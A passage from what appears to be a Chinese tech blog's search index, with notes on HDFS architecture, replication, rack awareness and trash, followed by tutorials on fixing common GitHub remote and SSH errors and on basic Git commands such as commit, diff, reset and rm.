1。如果你是在hdfs-site.xml设置了dfs.replication，这并一定就得了，因为你可能没把conf文件夹加入到你的 project的classpath里，你的程序运行时取的dfs.replication可能是hdfs-default.xml里的 dfs.replication，默认是3。可能这个就是造成你为什么dfs.replication老是3的原因。你可以试试在创建文件时，显式设定replication。replication一般到3就可以了，大了意义也不大。 5.HDFS负载均衡&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HDFS的数据也许并不是非常均匀的分布在各个DataNode中。一个常见的原因是在现有的集群上经常会增添新的DataNode节点。当新增一个数据块（一个文件的数据被保存在一系列的块中）时，NameNode在选择DataNode接收这个数据块之前，会考虑到很多因素。其中的一些考虑的是： 将数据块的一个副本放在正在写这个数据块的节点上。 尽量将数据块的不同副本分布在不同的机架上，这样集群可在完全失去某一机架的情况下还能存活。 一个副本通常被放置在和写文件的节点同一机架的某个节点上，这样可以减少跨越机架的网络I/O。 尽量均匀地将HDFS数据分布在集群的DataNode中。 6.HDFS机架感知HDFS机架感知&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通常，大型 Hadoop 集群是以机架的形式来组织的，同一个机架上不同 节点间的网络状况比不同机架之间的更为理想。 另外， NameNode 设法将 数据块副本保存在不同的机架上以提高容错性。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;而 HDFS 不能够自动判断集群中各个 datanode 的网络拓扑情况 Hadoop 允 许集群的管理员通过配置 dfs.network.script 参数来确定节点所处的机架。 文 件提供了 IP-&gt;rackid 的翻译。 NameNode 通过这个得到集群中各个 datanode 机器的 rackid 。 如果 topology.script.file.name 没有设定，则每个 IP 都会翻译 成 / default-rack。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有了机架感知， NameNode 就可以画出上图所示的 datanode 网络拓扑图。 D1,R1 都是交换机，最底层是 datanode 。 则 H1 的 rackid=/D1/R1/H1 ， H1 的 parent 是 R1 ， R1 的是 D1 。 这些 rackid 信息可以通过 topology.script.file.name 配置。有了这些 rackid 信息就可以计算出任意两台 datanode 之间的距离。 distance(/D1/R1/H1,/D1/R1/H1)=0 相同的 datanodedistance(/D1/R1/H1,/D1/R1/H2)=2 同一 rack 下的不同 datanodedistance(/D1/R1/H1,/D1/R1/H4)=4 同一 IDC 下的不同 datanodedistance(/D1/R1/H1,/D2/R3/H7)=6 不同 IDC 下的 datanode 7.HDFS访问访问方式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; HDFS 给应用提供了多种访问方式。用户可以通过 Java API 接口访问，也 可以通过 C 语言的封装 API 访问，还可以通过浏览器的方式访问 HDFS 中的文件。 8.HDFS 健壮性&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HDFS 的主要目标就是即使在出错的情况下也要保证数据存储的可靠性。 常见的三种出错情况是： Namenode 出错 , Datanode 出错和网络割裂 ( network partitions) 。 磁盘数据错误，心跳检测和重新复制&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每个 Datanode 节点周期性地向 Namenode 发送心跳信号。网络割裂可能 导致一部分 Datanode 跟 Namenode 失去联系。 Namenode 通过心跳信号的缺 失来检测这一情况，并将这些近期不再发送心跳信号 Datanode 标记为宕机 ，不会再将新的 IO 请求发给它们。任何存储在宕机 Datanode 上的数据将不 再有效。 Datanode 的宕机可能会引起一些数据块的副本系数低于指定值， Namenode 不断地检测这些需要复制的数据块，一旦发现就启动复制操作。 在下列情况下，可能需要重新复制：某个 Datanode 节点失效，某个副本遭 到损坏， Datanode 上的硬盘错误，或者文件的副本系数增大。 数据完整性&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从某个 Datanode 获取的数据块有可能是损坏的，损坏可能是由 Datanode 的存储设备错误、网络错误或者软件 bug 造成的。 HDFS 客户端软 件实现了对 HDFS 文件内容的校验和 (checksum) 检查。当客户端创建一个新 的 HDFS 文件，会计算这个文件每个数据块的校验和，并将校验和作为一个 单独的隐藏文件保存在同一个 HDFS 名字空间下。当客户端获取文件内容后 ，它会检验从 Datanode 获取的数据跟相应的校验和文件中的校验和是否匹 配，如果不匹配，客户端可以选择从其他 Datanode 获取该数据块的副本。 元数据磁盘错误&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;FsImage 和 Editlog 是 HDFS 的核心数据结构。如果这些文件损坏了，整个 HDFS 实例都将失效。因而， Namenode 可以配置成支持维护多个 FsImage 和 Editlog 的副本。任何对 FsImage 或者 Editlog 的修改，都将同步到它们的副 本上。这种多副本的同步操作可能会降低 Namenode 每秒处理的名字空间事 务数量。然而这个代价是可以接受的，因为即使 HDFS 的应用是数据密集的 ，它们也非元数据密集的。当 Namenode 重启的时候，它会选取最近的完整 的 FsImage 和 Editlog 来使用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Namenode 是 HDFS 集群中的单点故障 (single point of failure) 所在。如果 Namenode 机器故障，是需要手工干预的。目前，自动重启或在另一台机器 上做 Namenode 故障转移的功能还没实现。 快照&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;快照支持某一特定时刻的数据的复制备份。利用快照，可以让 HDFS 在 数据损坏时恢复到过去一个已知正确的时间点。 HDFS 目前还不支持快照功 能，但计划在将来的版本进行支持。 9.HDFS 文件删除恢复机制&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当用户或应用程序删除某个文件时，这个文件并没有立刻从 HDFS 中删 除。实际上， HDFS 会将这个文件重命名转移到 /trash 目录。只要文件还在 /trash 目录中，该文件就可以被迅速地恢复。文件在 /trash 中保存的时间是可 配置的，当超过这个时间时， Namenode 就会将该文件从名字空间中删除。 删除文件会使得该文件相关的数据块被释放。注意，从用户删除文件到 HDFS 空闲空间的增加之间会有一定时间的延迟。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;只要被删除的文件还在 /trash 目录中，用户就可以恢复这个文件。如果 用户想恢复被删除的文件，他 / 她可以浏览 /trash 目录找回该文件。 /trash 目 录仅仅保存被删除文件的最后副本。 /trash 目录与其他的目录没有什么区别 ，除了一点：在该目录上 HDFS 会应用一个特殊策略来自动删除文件。目前 的默认策略是删除 /trash 中保留时间超过 6 小时的文件。将来，这个策略可以 通过一个被良好定义的接口配置。 开启回收站12345678910hdfs-site.xml &lt;configuration&gt; &lt;property&gt; &lt;name&gt;fs.trash.interval&lt;/name&gt; &lt;value&gt; 1440 &lt;/value&gt; &lt;description&gt;Number ofminutes between trash checkpoints. If zero, the trashfeature is disabled. &lt;/description&gt; &lt;/property&gt; &lt;/configuration&gt; fs.trash.interval参数设置保留时间为 1440 分钟(1天) 回收站的位置：在HDFS上的 /user/$USER/.Trash/Current/ 10.HDFS 分布式缓存（DistributedCache ） 在HDFS上准备好要共享的数据(text、archive、jar)，你拼路径的时候必须加前缀”file://“说明是本地路径，否则hadoop默认访问的路径是hdfs。 DistributedCache 在 Mapper 或者 Reducer 启动时会被 copy to local，然后被 DistributedCache.getLocalCacheFiles() 调用，运行完 job 后 local cache file 会被删掉，如果另一个 job 也需要这样一份文件，需要重新添加、重新缓存，因为在分布式场景下 task 并不知道该 node 是否存在 cache file。如果在同台机器已经有了dist cache file,不会再次download，DistributedCache 根据缓存文档修改的时间戳进行追踪。 在作业执行期间，当前应用程序或者外部程序不能修改缓存文件，所以分布式缓存一般用来缓存只读文件。 DistributedCache 在添加的时候注意要添加具体的文件，如果你添加目录，DistributedCache 将不会自动遍历、识别目录下的文件。 11.HDFS缺点大量小文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因为 Namenode 把文件系统的元数据放置在内存中，所以文件系统所能 容纳的文件数目是由 Namenode 的内存大小来决定。一般来说，每一个文件 、文件夹和 Block 需要占据 150 字节左右的空间，所以，如果你有 100 万个文 件，每一个占据一个 Block ，你就至少需要 300MB 内存。当前来说，数百万 的文件还是可行的，当扩展到数十亿时，对于当前的硬件水平来说就没法实 现了。还有一个问题就是，因为 Map task 的数量是由 splits 来决定的，所以 用 MR 处理大量的小文件时，就会产生过多的 Maptask ，线程管理开销将会 增加作业时间。举个例子，处理 10000M 的文件，若每个 split 为 1M ，那就会 有 10000 个 Maptasks ，会有很大的线程开销；若每个 split 为 100M ，则只有 100 个 Maptasks ，每个 Maptask 将会有更多的事情做，而线程的管理开销也 将减小很多。]]></content>
      <tags>
        <tag>Hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【Hadoop】HDFS的运行原理]]></title>
    <url>%2F2017%2F08%2F18%2FHadoop%2F7.%20%E3%80%90Hadoop%E3%80%91HDFS%E7%9A%84%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86%2F</url>
    <content type="text"><![CDATA[【Hadoop】HDFS的运行原理简介&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HDFS（Hadoop Distributed File System ）Hadoop分布式文件系统。是根据google发表的论文翻版的。论文为GFS（Google File System）Google 文件系统（中文，英文）。 HDFS有很多特点： 保存多个副本，且提供容错机制，副本丢失或宕机自动恢复。默认存3份。 运行在廉价的机器上。 适合大数据的处理。多大？多小？HDFS默认会将文件分割成block，64M为1个block。然后将block按键值对存储在HDFS上，并将键值对的映射存到内存中。如果小文件太多，那内存的负担会很重。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如上图所示，HDFS也是按照Master和Slave的结构。分NameNode、SecondaryNameNode、DataNode这几个角色。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;NameNode：是Master节点，是大领导。管理数据块映射；处理客户端的读写请求；配置副本策略；管理HDFS的名称空间； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SecondaryNameNode：是一个小弟，分担大哥namenode的工作量；是NameNode的冷备份；合并fsimage和fsedits然后再发给namenode。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;DataNode：Slave节点，奴隶，干活的。负责存储client发来的数据块block；执行数据块的读写操作。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;热备份：b是a的热备份，如果a坏掉。那么b马上运行代替a的工作。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;冷备份：b是a的冷备份，如果a坏掉。那么b不能马上代替a工作。但是b上存储a的一些信息，减少a坏掉之后的损失。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;fsimage:元数据镜像文件（文件系统的目录树。） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;edits：元数据的操作日志（针对文件系统做的修改操作记录） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;namenode内存中存储的是=fsimage+edits &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SecondaryNameNode负责定时默认1小时，从namenode上，获取fsimage和edits来进行合并，然后再发送给namenode。减少namenode的工作量。 工作原理写操作： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有一个文件FileA，100M大小。Client将FileA写入到HDFS上。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HDFS按默认配置。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HDFS分布在三个机架上Rack1，Rack2，Rack3。 Client将FileA按64M分块。分成两块，block1和Block2; Client向nameNode发送写数据请求，如图蓝色虚线①——&gt;。 NameNode节点，记录block信息。并返回可用的DataNode，如粉色虚线②———&gt;。 Block1: host2,host1,host3Block2: host7,host8,host4 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;原理： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;NameNode具有RackAware机架感知功能，这个可以配置。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;若client为DataNode节点，那存储block时，规则为：副本1，同client的节点上；副本2，不同机架节点上；副本3，同第二个副本机架的另一个节点上；其他副本随机挑选。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;若client不为DataNode节点，那存储block时，规则为：副本1，随机选择一个节点上；副本2，不同副本1，机架上；副本3，同副本2相同的另一个节点上；其他副本随机挑选。 client向DataNode发送block1；发送过程是以流式写入。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;流式写入过程， 1.将64M的block1按64k的package划分; 2.然后将第一个package发送给host2; 3.host2接收完后，将第一个package发送给host1，同时client想host2发送第二个package； 4.host1接收完第一个package后，发送给host3，同时接收host2发来的第二个package。 5.以此类推，如图红线实线所示，直到将block1发送完毕。 6.host2,host1,host3向NameNode，host2向Client发送通知，说“消息发送完了”。如图粉红颜色实线所示。 7.client收到host2发来的消息后，向namenode发送消息，说我写完了。这样就真完成了。如图黄色粗实线 8.发送完block1后，再向host7，host8，host4发送block2，如图蓝色实线所示。 9.发送完block2后，host7,host8,host4向NameNode，host7向Client发送通知，如图浅绿色实线所示。 10.client向NameNode发送消息，说我写完了，如图黄色粗实线。。。这样就完毕了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;分析，通过写过程，我们可以了解到： 写1T文件，我们需要3T的存储，3T的网络流量贷款。 在执行读或写的过程中，NameNode和DataNode通过HeartBeat进行保存通信，确定DataNode活着。如果发现DataNode死掉了，就将死掉的DataNode上的数据，放到其他节点去。读取时，要读其他节点去。 挂掉一个节点，没关系，还有其他节点可以备份；甚至，挂掉某一个机架，也没关系；其他机架上，也有备份。 读操作： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;读操作就简单一些了，如图所示，client要从datanode上，读取FileA。而FileA由block1和block2组成。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;那么，读操作流程为： client向namenode发送读请求。 namenode查看Metadata信息，返回fileA的block的位置。block1:host2,host1,host3block2:host7,host8,host4 block的位置是有先后顺序的，先读block1，再读block2。而且block1去host2上读取；然后block2，去host7上读取； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面例子中，client位于机架外，那么如果client位于机架内某个DataNode上，例如,client是host6。那么读取的时候，遵循的规律是：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;优选读取本机架上的数据。 HDFS中常用到的命令1、hadoop fs12345678910111213hadoop fs -ls / hadoop fs -lsr hadoop fs -mkdir /user/hadoop hadoop fs -put a.txt /user/hadoop/ hadoop fs -get /user/hadoop/a.txt / hadoop fs -cp src dst hadoop fs -mv src dst hadoop fs -cat /user/hadoop/a.txt hadoop fs -rm /user/hadoop/a.txt hadoop fs -rmr /user/hadoop/a.txt hadoop fs -text /user/hadoop/a.txt hadoop fs -copyFromLocal localsrc dst #与hadoop fs -put功能类似。 hadoop fs -moveFromLocal localsrc dst #将本地文件上传到hdfs，同时删除本地文件。 2、hadoop fsadmin123hadoop dfsadmin -report hadoop dfsadmin -safemode enter | leave | get | wait hadoop dfsadmin -setBalancerBandwidth 1000 3、hadoop fsck4、start-balancer.sh]]></content>
      <tags>
        <tag>Hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[github常见操作和常见错误 错误提示 fatal remote origin already exists.]]></title>
    <url>%2F2017%2F08%2F18%2FGit%2F2.%20%20github%E5%B8%B8%E8%A7%81%E6%93%8D%E4%BD%9C%E5%92%8C%E5%B8%B8%E8%A7%81%E9%94%99%E8%AF%AF%20%20%E9%94%99%E8%AF%AF%E6%8F%90%E7%A4%BA%20%20fatal%20%20%20remote%20origin%20already%20exists.%2F</url>
    <content type="text"><![CDATA[github常见操作和常见错误 错误提示 fatal remote origin already exists.&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果输入 1Git remote add origin git@github.com:djqiang（github帐号名）/gitdemo（项目名）.git &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;提示出错信息： 1fatal: remote origin already exists. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决办法如下： 先输入 $ git remote rm origin 再输入 $ git remote add origin git@github.com:djqiang/gitdemo.git 就不会报错了！ 如果输入 $ git remote rm origin 还是报错的话，error: Could not remove config section ‘remote.origin’. 我们需要修改gitconfig文件的内容 找到github的安装路径，我的是C:\Users\ASUS\AppData\Local\GitHub\PortableGit_ca477551eeb4aea0e4ae9fcd3358bd96720bb5c8\etc 找到一个名为gitconfig的文件，打开它把里面的[remote “origin”]那一行删掉就好了！ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果输入 1ssh -T git@github.com &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;出现错误提示：Permission denied (publickey).因为新生成的key不能加入ssh就会导致连接不上github。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决办法如下： 先输入$ ssh-agent，再输入$ ssh-add ~/.ssh/id_key，这样就可以了。 如果还是不行的话，输入ssh-add ~/.ssh/id_key 命令后出现报错Could not open a connection to your authentication agent.解决方法是key用Git Gui的ssh工具生成，这样生成的时候key就直接保存在ssh中了，不需要再ssh-add命令加入了，其它的user，token等配置都用命令行来做。 最好检查一下在你复制id_rsa.pub文件的内容时有没有产生多余的空格或空行，有些编辑器会帮你添加这些的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果输入 1git push origin master &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;提示出错信息： 1error:failed to push som refs to ....... &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决办法如下： 先输入$ git pull origin master //先把远程服务器github上面的文件拉下来 再输入$ git push origin master 如果出现报错 fatal: Couldn’t find remote ref master或者fatal: ‘origin’ does not appear to be a git repository以及fatal: Could not read from remote repository. 则需要重新输入$ git remote add origingit@github.com:djqiang/gitdemo.git &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用git在本地创建一个项目的过程 12345678makdir ~/hello-world //创建一个项目hello-worldcd ~/hello-world //打开这个项目git init //初始化 touch READMEgit add README //更新README文件git commit -m 'first commit' //提交更新，并注释信息“first commit” git remote add origin git@github.com:defnngj/hello-world.git //连接远程github项目 git push -u origin master //将本地项目更新到github项目上去 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;gitconfig配置文件 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Git有一个工具被称为git config，它允许你获得和设置配置变量；这些变量可以控制Git的外观和操作的各个方面。这些变量可以被存储在三个不同的位置： /etc/gitconfig 文件：包含了适用于系统所有用户和所有库的值。如果你传递参数选项’–system’ 给 git config，它将明确的读和写这个文件。 ~/.gitconfig 文件 ：具体到你的用户。你可以通过传递–global 选项使Git 读或写这个特定的文件。 位于git目录的config文件 (也就是 .git/config) ：无论你当前在用的库是什么，特定指向该单一的库。每个级别重写前一个级别的值。因此，在.git/config中的值覆盖了在/etc/gitconfig中的同一个值。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在Windows系统中，Git在$HOME目录中查找.gitconfig文件（对大多数人来说，位于C:\Documents and Settings\$USER下）。它也会查找/etc/gitconfig，尽管它是相对于Msys 根目录的。这可能是你在Windows中运行安装程序时决定安装Git的任何地方。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置相关信息： 当你安装Git后首先要做的事情是设置你的用户名称和e-mail地址。这是非常重要的，因为每次Git提交都会使用该信息。它被永远的嵌入到了你的提交中： 12345678910git config --global user.name "John Doe"git config --global user.email johndoe@example.com``` 2. 你的编辑器(Your Editor)&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;现在，标识已经设置，可以配置缺省文本编辑器，Git在需要输入一些消息时会使用该文本编辑器。缺省情况下，Git使用系统的缺省编辑器，这通常可能是vi 或者 vim。如果想使用一个不同的文本编辑器，例如Emacs，可以做如下操作：```bashgit config --global core.editor emacs 检查设置(Checking Your Settings) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果想检查设置，可以使用 git config –list 命令来列出Git可以在该处找到的所有的设置: 1git config --list &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也可以查看Git认为的一个特定的关键字目前的值，使用如下命令 git config {key}: 1git config user.name 获取帮助(Getting help) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果当你在使用Git时需要帮助，有三种方法可以获得任何git命令的手册页(manpage)帮助信息: 123git help &lt;verb&gt;git &lt;verb&gt; --helpman git-&lt;verb&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如，你可以运行如下命令获取对config命令的手册页帮助: 1git help config]]></content>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git安装使用]]></title>
    <url>%2F2017%2F08%2F18%2FGit%2F1.%20Git%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Git安装使用1.安装git&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;centos上 1[root@localhost ~]# yum install -y epel-release 1[root@localhost ~]# yum install -y git &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ubuntu上 1sudo apt-get install git &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;windows 上安装 msysgit,下载地址 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装完成后，还需要最后一步设置 12[root@localhost ~]# git config --global user.name "yanyi"[root@localhost ~]# git config --global user.email "hcldir@qq.com" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设置完成会生成 .gitconfig 文件 123456[root@localhost ~]# ls -la-rw-r--r-- 1 root root 44 1月 6 20:01 .gitconfig[root@localhost ~]# cat .gitconfig [user] name = yanyi email = hcldir@qq.com 2.创建版本库1234[root@localhost ~]# mkdir /home/gitroot[root@localhost ~]# cd /home/gitroot[root@localhost gitroot]# git initInitialized empty Git repository in /home/gitroot/.git/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：git init 用这个命令初始化，让这个目录变成git可以管理的仓库。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ls -a 可以看到多了一个 .git 文件 12[root@localhost gitroot]# ls -a. .. .git 3.提交文件到仓库&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建一个文件 1.txt 123456[root@localhost gitroot]# echo -e "123\naaa\n456\nbbb" &gt; 1.txt[root@localhost gitroot]# cat 1.txt123aaa456bbb &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;把1.txt添加到仓库中 1[root@localhost gitroot]# git add 1.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;add 完了必须要 commit 才算真正把文件提交到git仓库里 1234[root@localhost gitroot]# git commit -m "add new file 1.txt"[master (root-commit) 0214d82] add new file 1.txt 1 files changed, 4 insertions(+), 0 deletions(-) create mode 100644 1.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;更改 1.txt后，查看和版本库是否一致 123456789[root@localhost gitroot]# git status# On branch master# Changed but not updated:# (use "git add &lt;file&gt;..." to update what will be committed)# (use "git checkout -- &lt;file&gt;..." to discard changes in working directory)## modified: 1.txt#no changes added to commit (use "git add" and/or "git commit -a") &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：git status 查看当前仓库中的状态，比如是否有改动的文件 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果不提交，需要把文件恢复成版本库里的文件 123456[root@localhost gitroot]# git checkout -- 1.txt[root@localhost gitroot]# cat 1.txt123aaa456bbb &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;再次执行 git status 命令，提示没有任何更改 1234567891011121314151617181920212223242526272829[root@localhost gitroot]# git status# On branch masternothing to commit (working directory clean)``` &amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;再次修改 1.txt文件，对比修改内容```bash[root@localhost gitroot]# echo -e "111111\n2222222222" &gt;&gt; 1.txt [root@localhost gitroot]# git status# On branch master# Changed but not updated:# (use "git add &lt;file&gt;..." to update what will be committed)# (use "git checkout -- &lt;file&gt;..." to discard changes in working directory)## modified: 1.txt#no changes added to commit (use "git add" and/or "git commit -a")[root@localhost gitroot]# git diff 1.txtdiff --git a/1.txt b/1.txtindex b149eee..aa2d2ae 100644--- a/1.txt+++ b/1.txt@@ -2,3 +2,5 @@ aaa 456 bbb+111111+2222222222 说明：git diff 1.txt 可以对比1.txt本次修改了什么内容，相比较仓库里面的版本。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;把更改个文件提交到版本库 1234567[root@localhost gitroot]# git add 1.txt[root@localhost gitroot]# git commit -m "add a line 1.txt"[master 182c98f] add a line 1.txt1 files changed, 2 insertions(+), 0 deletions(-)[root@localhost gitroot]# git status# On branch masternothing to commit (working directory clean) 4.版本回退&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;多更改几次1.txt，并进行 git add, git commit操作 12345678910111213[root@localhost gitroot]# echo "asdfkjsadkjf" &gt;&gt; 1.txt[root@localhost gitroot]# git add 1.txt[root@localhost gitroot]# git commit -m "change 1.txt agin"[master 0c72aba] change 1.txt agin 1 files changed, 1 insertions(+), 0 deletions(-)[root@localhost gitroot]# echo "123456" &gt;&gt; 1.txt[root@localhost gitroot]# git add 1.txt[root@localhost gitroot]# git commit -m "change 1.txt agin agin"[master e4fe595] change 1.txt agin agin 1 files changed, 1 insertions(+), 0 deletions(-)[root@localhost gitroot]# git status# On branch masternothing to commit (working directory clean) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;git log 查看所有提交git仓库的记录操作 123456789101112131415161718192021222324[root@localhost gitroot]# git logcommit e4fe59596fc6c16757cb1d772d775932701f86abAuthor: yanyi &lt;hcldir@qq.com&gt;Date: Fri Jan 6 21:57:43 2017 +0800 change 1.txt agin agincommit 0c72aba21aba27ccc9c9873ec53c552d5474a02fAuthor: yanyi &lt;hcldir@qq.com&gt;Date: Fri Jan 6 21:56:41 2017 +0800 change 1.txt agincommit 182c98ff8798f47965ba44ed218e9da5e9964295Author: yanyi &lt;hcldir@qq.com&gt;Date: Fri Jan 6 20:34:15 2017 +0800 add a line 1.txtcommit 0214d8252fd3c37a7f09fc32e8ff29d10d577230Author: yanyi &lt;hcldir@qq.com&gt;Date: Fri Jan 6 20:15:19 2017 +0800 add new file 1.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;根据这个 log 可退回到前边某个版本 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;git log –pretty=oneline 命令可以让每个版本单独一行显示，更清晰。 12345[root@localhost gitroot]# git log --pretty=onelinee4fe59596fc6c16757cb1d772d775932701f86ab change 1.txt agin agin0c72aba21aba27ccc9c9873ec53c552d5474a02f change 1.txt agin182c98ff8798f47965ba44ed218e9da5e9964295 add a line 1.txt0214d8252fd3c37a7f09fc32e8ff29d10d577230 add new file 1.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;git reset –hard 字符串 可以退回到以前版本，字符串可以简写，只写前边几位 12[root@localhost gitroot]# git reset --hard 182cHEAD is now at 182c98f add a line 1.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;退回版本后，在 git log 则无法显示退回版本以上的版本 123[root@localhost gitroot]# git log --pretty=oneline182c98ff8798f47965ba44ed218e9da5e9964295 add a line 1.txt0214d8252fd3c37a7f09fc32e8ff29d10d577230 add new file 1.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;git reflog 可以显示所有版本 1234567[root@localhost gitroot]# git refloge4fe595 HEAD@&#123;0&#125;: e4fe5: updating HEAD182c98f HEAD@&#123;1&#125;: 182c: updating HEADe4fe595 HEAD@&#123;2&#125;: commit: change 1.txt agin agin0c72aba HEAD@&#123;3&#125;: commit: change 1.txt agin182c98f HEAD@&#123;4&#125;: commit: add a line 1.txt0214d82 HEAD@&#123;5&#125;: commit (initial): add new file 1.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后可以使用 git reset –hard 字符串 再次退回版本。 5.撤销修改（文件恢复）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果修改文件后，发现改的不对，想恢复到上一次提交的状态，或不小心删除了文件。可以使用 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;git checkout – file 恢复到上一次提交的状态。 1[root@localhost gitroot]# git checkout 1.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果文件修改完成，保存后，git add 了，但没有 commit ，想退回到上一次提交的状态可以用git reset HEAD ，再使用 git checkout – file 123456789101112[root@localhost gitroot]# git add 1.txt[root@localhost gitroot]# git status# On branch master# Changes to be committed:# (use "git reset HEAD &lt;file&gt;..." to unstage)## modified: 1.txt#[root@localhost gitroot]# git reset HEAD 1.txtUnstaged changes after reset:M 1.txt[root@localhost gitroot]# git checkout -- 1.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果不仅 add 又 commit 了，就用版本退回恢复到上一次提交状态。 6.文件删除&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;新建 2.txt 文件，add 并 commit 提交到 git 仓库。 123456[root@localhost gitroot]# echo "2222222" &gt;&gt; 2.txt[root@localhost gitroot]# git add 2.txt[root@localhost gitroot]# git commit -m " a new 2.txt"[master 44ec005] a new 2.txt 1 files changed, 1 insertions(+), 0 deletions(-) create mode 100644 2.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面删除它 1[root@localhost gitroot]# rm -rf 2.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;git status 可以看到，提示 2.txt 被删除 123456789[root@localhost gitroot]# git status# On branch master# Changed but not updated:# (use "git add/rm &lt;file&gt;..." to update what will be committed)# (use "git checkout -- &lt;file&gt;..." to discard changes in working directory)## deleted: 2.txt#no changes added to commit (use "git add" and/or "git commit -a") &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果需要恢复就用 git checkout – 2.txt，现在是要从 git 仓库里删除 2.txt，命令 git rm file 123456[root@localhost gitroot]# git rm 2.txtrm '2.txt'[root@localhost gitroot]# git commit -m "delete 2.txt"[master b01be1a] delete 2.txt 1 files changed, 0 insertions(+), 1 deletions(-) delete mode 100644 2.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就彻底从 git 